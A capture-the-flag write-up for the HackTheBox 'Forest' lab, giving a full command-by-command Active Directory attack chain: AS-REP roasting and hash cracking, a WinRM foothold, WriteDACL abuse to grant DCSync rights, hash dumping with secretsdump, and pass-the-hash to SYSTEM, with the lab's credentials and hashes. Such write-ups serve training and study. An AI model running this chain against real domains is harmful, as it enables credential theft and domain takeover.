# 📝 HTB — Forest

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows — Active Directory  
**Attack Path:** AS-REP Roast → WriteDACL → DCSync → Domain Admin

---

## Machine Info

| Field | Value |
|-------|-------|
| IP | 10.10.10.161 |
| Domain | htb.local |
| DC Hostname | FOREST |
| Key Techniques | AS-REP Roasting, ACL Abuse (WriteDACL), DCSync |

---

## Environment Setup

```bash
export ip=10.10.10.161
export domain=htb.local
echo "$ip forest.htb.local htb.local forest" >> /etc/hosts
mkdir -p scan enum creds loot
```

---

## Phase 1 — Recon

```bash
nmap -p- -T4 --min-rate=1000 -oN scan/nmap-full.txt $ip
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
  -sV -sC -oN scan/nmap-svc.txt $ip
```

**Key open ports:**

```
53    DNS
88    Kerberos
135   RPC
139/445 SMB
389   LDAP
5985  WinRM
```

---

## Phase 2 — Domain Enumeration

```bash
# RPC anonymous
rpcclient -U "" -N $ip
rpcclient> enumdomusers
rpcclient> enumdomgroups

# RID brute
nxc smb $ip -u '' -p '' --rid-brute | tee enum/raw-rid.txt
grep "SidTypeUser" enum/raw-rid.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > enum/users.txt
```

**Users discovered:**

```
sebastien
lucinda
svc-alfresco     ← service account
andy
mark
santi
```

---

## Phase 3 — AS-REP Roasting

`svc-alfresco` has **DontRequirePreAuth** set — no credentials needed.

```bash
sudo impacket-GetNPUsers $domain/ -usersfile enum/users.txt \
  -format hashcat -outputfile creds/asrep-hashes.txt -dc-ip $ip

# Hash captured:
# $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

```bash
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt
# Result: svc-alfresco : s3rvice
```

---

## Phase 4 — Initial Foothold

```bash
export user=svc-alfresco
export pass=s3rvice

nxc smb $ip -u $user -p $pass
nxc winrm $ip -u $user -p $pass      # [+] confirms WinRM access

evil-winrm -i $ip -u $user -p $pass
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
[USER FLAG]
```

---

## Phase 5 — BloodHound → WriteDACL Path

```bash
sudo nxc ldap $ip -u $user -p $pass --bloodhound --collection All --dns-server $ip
```

**BloodHound path:**

```
svc-alfresco
  → [MemberOf] → Service Accounts
  → [MemberOf] → Privileged IT Accounts
  → [MemberOf] → Account Operators
  → [WriteDACL] → HTB.LOCAL (domain object)
```

**Plan:** WriteDACL on domain object → grant own account DCSync rights → secretsdump.

---

## Phase 6 — WriteDACL → DCSync

```bash
# Inside evil-winrm shell:
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" \
  -PrincipalIdentity svc-alfresco -Rights DCSync

# DCSync from Kali
sudo impacket-secretsdump htb.local/svc-alfresco:s3rvice@$ip -just-dc-ntlm \
  | tee loot/dcsync.txt

# Administrator hash:
# administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

---

## Phase 7 — Domain Admin

```bash
sudo impacket-psexec htb.local/administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
[ROOT FLAG]
```

---

## Attack Chain Summary

```
nmap → open ports (88, 389, 445, 5985)
  ↓
RPC anonymous + RID brute → users.txt (svc-alfresco found)
  ↓
AS-REP Roast → $krb5asrep$23$ hash → crack → svc-alfresco:s3rvice
  ↓
evil-winrm → user.txt
  ↓
BloodHound → WriteDACL path → Account Operators → HTB.LOCAL
  ↓
Add-DomainObjectAcl → DCSync rights granted
  ↓
secretsdump → Administrator NTLM hash
  ↓
PSExec PTH → SYSTEM → root.txt
```

---

## Key Takeaways

```
1. Service accounts often have weak passwords — AS-REP roast the full user list
2. Account Operators group has WriteDACL → treat as DA stepping stone
3. WriteDACL on domain object = DCSync rights = game over
4. BloodHound reveals chained paths that manual enum would miss entirely
```

---

**MITRE ATT&CK:** T1558.004 (AS-REP Roasting) · T1222 (Permissions Modification) · T1003.006 (DCSync)

[← Back to Writeups](README.md)
